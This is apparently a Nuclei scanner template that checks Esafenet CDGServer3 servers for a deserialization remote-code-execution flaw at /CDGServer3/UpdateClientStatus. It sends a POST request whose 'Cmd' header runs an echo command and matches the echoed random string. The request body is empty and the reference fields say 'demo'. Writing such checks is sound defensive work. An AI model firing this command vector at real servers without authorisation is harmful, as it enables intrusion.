id: esafenet-cdgserver3-UpdateClientStatus-rce
info:
  name: esafenet-cdgserver3-UpdateClientStatus-rce
  author: leadlife
  severity: critical
  description: 亿赛通电子文档安全管理系统 UpdateClientStatus 反序列化漏洞，该漏洞发生在应用程序将外部输入（如用户提交的数据）反序列化为对象或数据结构时，由于缺乏充分的输入验证和安全措施，攻击者可以利用恶意数据来执行未经授权的代码或攻击。
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: esafenet,rce

http:
  - raw:
      - |
        POST /CDGServer3/UpdateClientStatus HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml
        Cmd: echo {{randstr}}

        

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'{{randstr}}')
        condition: and